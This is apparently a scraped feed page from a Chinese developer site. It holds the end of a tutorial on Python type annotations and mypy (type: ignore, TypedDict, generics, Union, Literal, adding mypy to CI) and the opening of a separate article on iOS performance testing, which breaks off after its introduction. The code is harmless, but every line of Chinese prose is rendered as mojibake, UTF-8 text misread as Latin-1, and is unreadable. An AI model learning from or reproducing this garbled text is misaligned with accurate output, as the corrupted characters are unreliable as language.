<h3 data-id="heading-9">å¿½ç•¥ç‰¹å®šé”™è¯¯</h3>
<p>æœ‰æ—¶å€™myPyå¤ªä¸¥æ ¼ï¼Œå¯ä»¥ä¸´æ—¶å¿½ç•¥ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">legacy_function</span>(<span class="hljs-params">param</span>):  <span class="hljs-comment"># type: ignore</span>
    <span class="hljs-comment"># è¿™ä¸ªè€ä»£ç æš‚æ—¶ä¸æƒ³æ”¹ç±»å‹æ³¨è§£</span>
    <span class="hljs-keyword">return</span> param * <span class="hljs-number">2</span>
</code></pre>
<p>æˆ–è€…å¿½ç•¥ç‰¹å®šé”™è¯¯ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">tricky_function</span>(<span class="hljs-params">data: <span class="hljs-built_in">dict</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-comment"># type: ignore[<span class="hljs-keyword">return</span>-value]  # å¿½ç•¥è¿”å›å€¼ç±»å‹æ£€æŸ¥</span>
    <span class="hljs-keyword">return</span> data.get(<span class="hljs-string">"key"</span>, <span class="hljs-string">""</span>)
</code></pre>
<h2 data-id="heading-10">å®æˆ˜åœºæ™¯ï¼šä»€ä¹ˆæ—¶å€™ç”¨ç±»å‹æ³¨è§£ï¼Ÿ</h2>
<h3 data-id="heading-11">âœ… å»ºè®®ä½¿ç”¨çš„åœºæ™¯</h3>
<ol>
<li><strong>å¤§å‹é¡¹ç›®</strong>ï¼šä»£ç è¶Šå¤šï¼Œç±»å‹æ³¨è§£è¶Šæœ‰ç”¨</li>
<li><strong>å›¢é˜Ÿåä½œ</strong>ï¼šåˆ«äººèƒ½å¿«é€Ÿçœ‹æ‡‚ä½ çš„ä»£ç </li>
<li><strong>APIæ¥å£</strong>ï¼šæ˜ç¡®è¾“å…¥è¾“å‡ºç±»å‹</li>
<li><strong>æ ¸å¿ƒä¸šåŠ¡é€»è¾‘</strong>ï¼šå‡å°‘bugï¼Œæé«˜å¯é æ€§</li>
<li><strong>å¼€æºé¡¹ç›®</strong>ï¼šè®©è´¡çŒ®è€…æ›´å®¹æ˜“ç†è§£ä»£ç </li>
</ol>
<h3 data-id="heading-12">âŒ å¯ä»¥ä¸ç”¨çš„åœºæ™¯</h3>
<ol>
<li><strong>å¿«é€ŸåŸå‹éªŒè¯</strong>ï¼šå†™è„šæœ¬æµ‹è¯•æƒ³æ³•</li>
<li><strong>ç®€å•çš„ä¸€æ¬¡æ€§è„šæœ¬</strong>ï¼šå‡ åè¡Œä»£ç è€Œå·²</li>
<li><strong>æ•°æ®ç§‘å­¦æ¢ç´¢</strong>ï¼šJupyter notebooké‡Œè·‘æ•°æ®åˆ†æ</li>
</ol>
<h3 data-id="heading-13">ğŸ¤” éœ€è¦æƒè¡¡çš„åœºæ™¯</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ•°æ®å¤„ç†ï¼šè¦ä¸è¦åŠ ç±»å‹æ³¨è§£ï¼Ÿ</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>(<span class="hljs-params">data</span>):  <span class="hljs-comment"># æ•°æ®å¯èƒ½æ˜¯list, tuple, numpy array...</span>
    <span class="hljs-comment"># ç®€å•åœºæ™¯ï¼šä¸åŠ æ³¨è§£æ›´çµæ´»</span>
    <span class="hljs-keyword">return</span> [x * <span class="hljs-number">2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data]

<span class="hljs-comment"># å¤æ‚åœºæ™¯ï¼šåŠ ä¸Šæ³¨è§£æ›´æ¸…æ™°</span>
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Union</span>, <span class="hljs-type">List</span>
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np

<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>(<span class="hljs-params">data: <span class="hljs-type">Union</span>[<span class="hljs-type">List</span>[<span class="hljs-built_in">float</span>], np.ndarray]</span>) -&gt; np.ndarray:
    <span class="hljs-comment"># æ˜ç¡®å¤„ç†é€»è¾‘ï¼ŒmyPyèƒ½å¸®å¿™æ£€æŸ¥</span>
    <span class="hljs-keyword">return</span> np.array(data) * <span class="hljs-number">2</span>
</code></pre>
<h2 data-id="heading-14">è¸©å‘æŒ‡å—ï¼šmyPyå¸¸è§é”™è¯¯</h2>
<h3 data-id="heading-15">1. ç¬¬ä¸‰æ–¹åº“æ²¡æœ‰ç±»å‹æ³¨è§£</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests

<span class="hljs-comment"># myPyä¼šæŠ¥é”™ï¼šLibrary does not support type checking</span>
response = requests.get(<span class="hljs-string">"https://api.example.com"</span>)
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å®‰è£…ç±»å‹å­˜æ ¹æ–‡ä»¶</span>
pip install types-requests

<span class="hljs-comment"># æˆ–è€…åœ¨é…ç½®æ–‡ä»¶ä¸­å¿½ç•¥</span>
<span class="hljs-comment"># mypy.ini</span>
[mypy-requests.*]
ignore_missing_imports = <span class="hljs-literal">True</span>
</code></pre>
<h3 data-id="heading-16">2. åŠ¨æ€å±æ€§è®¿é—®</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">dict</span></span>):
        <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> data.items():
            <span class="hljs-built_in">setattr</span>(self, key, value)  <span class="hljs-comment"># myPyä¸è®¤è¯†åŠ¨æ€å±æ€§</span>

user = User({<span class="hljs-string">"name"</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"age"</span>: <span class="hljs-number">25</span>})
<span class="hljs-built_in">print</span>(user.name)  <span class="hljs-comment"># myPyæŠ¥é”™ï¼šUser has no attribute "name"</span>
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Any</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">dict</span></span>):
        <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> data.items():
            <span class="hljs-built_in">setattr</span>(self, key, value)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattr__</span>(<span class="hljs-params">self, name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Any</span>:
        <span class="hljs-comment"># è®©myPyçŸ¥é“è¿™ä¸ªç±»å¯èƒ½æœ‰å¾ˆå¤šå±æ€§</span>
        <span class="hljs-keyword">return</span> self.__dict__.get(name)
</code></pre>
<h3 data-id="heading-17">3. å­—å…¸é”®å€¼ç±»å‹æ¨æ–­</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_data</span>() -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"name"</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"age"</span>: <span class="hljs-number">25</span>}

user = get_user_data()
<span class="hljs-built_in">print</span>(user[<span class="hljs-string">"name"</span>])  <span class="hljs-comment"># myPyä¸çŸ¥é“è¿™ä¸ªé”®å­˜åœ¨</span>
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> TypedDict

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserData</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    name: <span class="hljs-built_in">str</span>
    age: <span class="hljs-built_in">int</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_data</span>() -&gt; UserData:
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"name"</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"age"</span>: <span class="hljs-number">25</span>}

user = get_user_data()
<span class="hljs-built_in">print</span>(user[<span class="hljs-string">"name"</span>])  <span class="hljs-comment"># myPyçŸ¥é“è¿™ä¸ªé”®ä¸€å®šå­˜åœ¨ï¼</span>
</code></pre>
<h2 data-id="heading-18">é«˜çº§æŠ€å·§ï¼šè®©ç±»å‹æ³¨è§£æ›´å¥½ç”¨</h2>
<h3 data-id="heading-19">1. æ³›å‹å‡½æ•°</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> TypeVar, <span class="hljs-type">List</span>

T = TypeVar(<span class="hljs-string">'T'</span>)  <span class="hljs-comment"># æ³›å‹ç±»å‹å˜é‡</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_first_item</span>(<span class="hljs-params">items: <span class="hljs-type">List</span>[T]</span>) -&gt; T:
    <span class="hljs-keyword">return</span> items[<span class="hljs-number">0</span>]

<span class="hljs-comment"># myPyèƒ½æ¨æ–­å‡ºæ­£ç¡®çš„è¿”å›ç±»å‹</span>
numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]
first_num = get_first_item(numbers)  <span class="hljs-comment"># ç±»å‹æ˜¯int</span>

strings = [<span class="hljs-string">"a"</span>, <span class="hljs-string">"b"</span>, <span class="hljs-string">"c"</span>]
first_str = get_first_item(strings)  <span class="hljs-comment"># ç±»å‹æ˜¯str</span>
</code></pre>
<h3 data-id="heading-20">2. è”åˆç±»å‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Union</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_id</span>(<span class="hljs-params">user_id: <span class="hljs-type">Union</span>[<span class="hljs-built_in">int</span>, <span class="hljs-built_in">str</span>]</span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(user_id, <span class="hljs-built_in">int</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"ID: <span class="hljs-subst">{user_id}</span>"</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"Username: <span class="hljs-subst">{user_id}</span>"</span>

<span class="hljs-comment"># Python 3.10+ æ›´ç®€æ´çš„å†™æ³•</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span> | <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(user_id, <span class="hljs-built_in">int</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"ID: <span class="hljs-subst">{user_id}</span>"</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"Username: <span class="hljs-subst">{user_id}</span>"</span>
</code></pre>
<h3 data-id="heading-21">3. å­—é¢é‡ç±»å‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Literal</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">set_status</span>(<span class="hljs-params">status: <span class="hljs-type">Literal</span>[<span class="hljs-string">"pending"</span>, <span class="hljs-string">"success"</span>, <span class="hljs-string">"error"</span>]</span>) -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Status: <span class="hljs-subst">{status}</span>"</span>)

set_status(<span class="hljs-string">"pending"</span>)  <span class="hljs-comment"># âœ… æ­£ç¡®</span>
set_status(<span class="hljs-string">"failed"</span>)   <span class="hljs-comment"># âŒ myPyæŠ¥é”™ï¼šä¸æ˜¯é¢„æœŸçš„å€¼</span>
</code></pre>
<h2 data-id="heading-22">æ€§èƒ½å½±å“ï¼šç±»å‹æ³¨è§£ä¼šè®©ä»£ç å˜æ…¢å—ï¼Ÿ</h2>
<p><strong>ç­”æ¡ˆï¼šä¸ä¼šï¼</strong></p>
<p>è®°ä½ï¼šPythonè§£é‡Šå™¨ä¼š<strong>å¿½ç•¥</strong>ç±»å‹æ³¨è§£ã€‚å®ƒä»¬åœ¨è¿è¡Œæ—¶å°±æ˜¯æ™®é€šçš„æ³¨é‡Šã€‚</p>
<p>ä½†æ˜¯ç±»å‹æ³¨è§£æœ¬èº«ä¼šå ç”¨ä¸€ç‚¹å†…å­˜ï¼Œä¸è¿‡è¿™ç‚¹å¼€é”€å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</p>
<p><strong>çœŸæ­£çš„å¥½å¤„æ˜¯ï¼š</strong></p>
<ol>
<li><strong>IDEæ›´æ™ºèƒ½</strong>ï¼šè‡ªåŠ¨è¡¥å…¨ã€å‚æ•°æç¤ºæ›´å‡†ç¡®</li>
<li><strong>é‡æ„æ›´å®‰å…¨</strong>ï¼šæ”¹å‡½æ•°åæ—¶ï¼ŒmyPyä¼šæ£€æŸ¥æ‰€æœ‰è°ƒç”¨ç‚¹</li>
<li><strong>æ–‡æ¡£æ›´æ¸…æ™°</strong>ï¼šç±»å‹å°±æ˜¯æœ€å¥½çš„æ–‡æ¡£</li>
</ol>
<h2 data-id="heading-23">ä»0åˆ°1ï¼šåœ¨ç°æœ‰é¡¹ç›®ä¸­å¼•å…¥mypy</h2>
<h3 data-id="heading-24">ç¬¬ä¸€æ­¥ï¼šå°èŒƒå›´è¯•ç‚¹</h3>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å…ˆæ£€æŸ¥ä¸€ä¸ªæ–‡ä»¶</span>
mypy utils.py
<span class="hljs-meta prompt_">
# </span><span class="bash">æˆ–è€…æ£€æŸ¥æŸä¸ªç›®å½•</span>
mypy src/utils/
</code></pre>
<h3 data-id="heading-25">ç¬¬äºŒæ­¥ï¼šé€æ­¥ä¿®å¤</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä»ç®€å•å¼€å§‹</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>):  <span class="hljs-comment"># æ²¡æœ‰ç±»å‹æ³¨è§£</span>
    <span class="hljs-keyword">return</span> a + b

<span class="hljs-comment"># åŠ ä¸ŠåŸºæœ¬æ³¨è§£</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-keyword">return</span> a + b
</code></pre>
<h3 data-id="heading-26">ç¬¬ä¸‰æ­¥ï¼šé…ç½®CI/CD</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># GitHub Actionsç¤ºä¾‹</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Check</span> <span class="hljs-string">types</span> <span class="hljs-string">with</span> <span class="hljs-string">mypy</span>
  <span class="hljs-attr">run:</span> <span class="hljs-string">|
    python -m pip install mypy
    mypy src/
</span></code></pre>
<h2 data-id="heading-27">æ€»ç»“ï¼šä¸ºä»€ä¹ˆä½ åº”è¯¥ç”¨ç±»å‹æ³¨è§£+mypy</h2>
<p>è®°ä½ä¸€å¥è¯ï¼š<strong>ç±»å‹æ³¨è§£æ˜¯ç»™æœªæ¥çš„è‡ªå·±å’ŒåŒäº‹æœ€å¥½çš„ç¤¼ç‰©ã€‚</strong></p>
<ol>
<li><strong>æå‰å‘ç°bug</strong>ï¼šè¿è¡Œå‰å°±å‘ç°ç±»å‹é”™è¯¯</li>
<li><strong>ä»£ç æ›´æ¸…æ™°</strong>ï¼šä¸€çœ‹å°±çŸ¥é“å‡½æ•°æœŸæœ›ä»€ä¹ˆç±»å‹</li>
<li><strong>é‡æ„æ›´å®‰å…¨</strong>ï¼šæ”¹ä»£ç æ—¶myPyå¸®ä½ æ£€æŸ¥</li>
<li><strong>IDEæ›´æ™ºèƒ½</strong>ï¼šæ›´å¥½çš„è‡ªåŠ¨è¡¥å…¨å’Œé”™è¯¯æç¤º</li>
<li><strong>å›¢é˜Ÿåä½œæ›´é¡ºç•…</strong>ï¼šå‡å°‘æ²Ÿé€šæˆæœ¬</li>
</ol>
<p>ä¸‹æ¬¡å†å†™Pythonä»£ç æ—¶ï¼Œåˆ«å†è£¸å¥”äº†ã€‚èŠ±å‡ ç§’é’ŸåŠ ä¸Šç±»å‹æ³¨è§£ï¼Œè¿è¡Œä¸€æ¬¡mypyæ£€æŸ¥ï¼Œä½ çš„ä»£ç ä¼šæ„Ÿè°¢ä½ çš„ï¼</p>
<hr/>
<p><strong>å»¶ä¼¸é˜…è¯»ï¼š</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmypy.readthedocs.io%2F" target="_blank" title="https://mypy.readthedocs.io/" ref="nofollow noopener noreferrer">mypyå®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.python.org%2Fdev%2Fpeps%2Fpep-0484%2F" target="_blank" title="https://www.python.org/dev/peps/pep-0484/" ref="nofollow noopener noreferrer">Pythonç±»å‹æ³¨è§£PEP 484</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.python.org%2F3%2Flibrary%2Ftyping.html%23typing.TypedDict" target="_blank" title="https://docs.python.org/3/library/typing.html#typing.TypedDict" ref="nofollow noopener noreferrer">TypedDictä½¿ç”¨æŒ‡å—</a></li>
</ul>
<p><strong>ä½ åœ¨é¡¹ç›®ä¸­ç”¨ç±»å‹æ³¨è§£å—ï¼Ÿé‡åˆ°äº†ä»€ä¹ˆå‘ï¼Ÿè¯„è®ºåŒºèŠèŠï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æ›´éªšçš„æ“ä½œï¼</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ„å»ºå¯è½åœ°çš„ iOS æ€§èƒ½æµ‹è¯•ä½“ç³»ï¼Œä»åœºæ™¯æ‹†è§£åˆ°å¤šå·¥å…·ååŒçš„å·¥ç¨‹åŒ–å®è·µ]]></title>    <link>https://juejin.cn/post/7581025279645810726</link>    <guid>https://juejin.cn/post/7581025279645810726</guid>    <pubDate>2025-12-08T06:02:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581025279645810726" data-draft-id="7580745065171386419" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ„å»ºå¯è½åœ°çš„ iOS æ€§èƒ½æµ‹è¯•ä½“ç³»ï¼Œä»åœºæ™¯æ‹†è§£åˆ°å¤šå·¥å…·ååŒçš„å·¥ç¨‹åŒ–å®è·µ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T06:02:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¼€å¿ƒçŒ´çˆ·"/> <meta itemprop="url" content="https://juejin.cn/user/2179705232165364"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ„å»ºå¯è½åœ°çš„ iOS æ€§èƒ½æµ‹è¯•ä½“ç³»ï¼Œä»åœºæ™¯æ‹†è§£åˆ°å¤šå·¥å…·ååŒçš„å·¥ç¨‹åŒ–å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2179705232165364/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¼€å¿ƒçŒ´çˆ·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T06:02:44.000Z" title="Mon Dec 08 2025 06:02:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å½“å‰çš„ç§»åŠ¨åº”ç”¨ç ”å‘ä½“ç³»ä¸­ï¼Œ<strong>iOS æ€§èƒ½æµ‹è¯•</strong> å·²æˆä¸ºè´¨é‡ä¿è¯ä¸­æœ€å¤æ‚å´ä¹Ÿæœ€å…³é”®çš„ä¸€ç¯ã€‚
éšç€ App åŠŸèƒ½ä¸æ–­æ‰©å¼ ã€ç•Œé¢å¤æ‚åº¦æå‡ã€è·¨ç«¯æŠ€æœ¯èå…¥ï¼ˆFlutterã€uni-appã€WebViewã€RNã€æ¸¸æˆå¼•æ“ç­‰ï¼‰ï¼Œæ€§èƒ½é—®é¢˜å·²ç»ä¸å†å±€é™äºâ€œå¡ä¸å¡â€â€œå¿«ä¸å¿«â€ï¼Œè€Œæ˜¯æ¶‰åŠ CPUã€GPUã€å†…å­˜ã€I/Oã€ç½‘ç»œã€ç³»ç»Ÿè¡Œä¸ºã€Hybrid è¿è¡Œæœºåˆ¶ç­‰å¤šä¸ªç»´åº¦ã€‚</p>
<p>å› æ­¤ï¼Œé«˜è´¨é‡çš„ iOS æ€§èƒ½æµ‹è¯•å¿…é¡»ä¾èµ– <strong>å¤šå·¥å…·ååŒ</strong>ï¼Œæ„å»ºä¸€ä¸ªå…·å¤‡å¯è§‚æµ‹ã€å¯å›æº¯ã€å¯é‡åŒ–ã€å¯å¤ç°èƒ½åŠ›çš„å·¥ç¨‹ä½“ç³»ï¼Œè€Œéç”¨æŸä¸€ä¸ªæµ‹è¯•å·¥å…·ç®€å•æµ‹é‡ FPS æˆ– CPU å°±ç»“æŸã€‚</p>
<p>æœ¬æ–‡åŸºäºå·¥ç¨‹ç»éªŒï¼Œå°† Instrumentsã€å…‹é­”ï¼ˆKeyMobï¼‰ã€PerfDogã€Safari Inspectorã€Charlesã€MetricKitã€Crashlyticsã€Xcode è°ƒè¯•å·¥å…·è”åˆèµ·æ¥ï¼Œæ„å»ºä¸€å¥—çœŸæ­£å¯è½åœ°çš„æ€§èƒ½æµ‹è¯•æ–¹æ³•è®ºã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€æ€§èƒ½æµ‹è¯•ä¸ºä½•ä¸èƒ½åªæµ‹ FPSï¼Ÿ</h2>
<p>è®¸å¤šå›¢é˜Ÿæœ€åˆåšæ€§èƒ½æµ‹è¯•æ—¶ä¼šçŠ¯ä¸€ä¸ªå¸¸è§è¯¯åŒºï¼š
<strong>åªå…³æ³¨æµç•…åº¦ï¼Œè€Œå¿½ç•¥ CPUã€å†…å­˜ã€ç½‘ç»œã€ç³»ç»Ÿè¡Œä¸ºç­‰ä¿¡æ¯ã€‚</strong></p>
<p>ä½†æ€§èƒ½é—®é¢˜çš„æœ¬è´¨æ˜¯â€œå¤šç»´äº¤äº’æ•ˆåº”â€ï¼š</p>
<h3 data-id="heading-1"><strong>1. UI å¡é¡¿å¯èƒ½ä¸æ˜¯ GPU é—®é¢˜ï¼Œè€Œæ˜¯ CPU æ­£åœ¨è§£æå¤§é‡ JSON</strong></h3>
<h3 data-id="heading-2"><strong>2. é¡µé¢åŠ è½½æ…¢å¯èƒ½ä¸æ˜¯ç½‘ç»œé—®é¢˜ï¼Œè€Œæ˜¯ WebView DOM è¿‡å¤§å¡ä½æ¸²æŸ“çº¿ç¨‹</strong></h3>
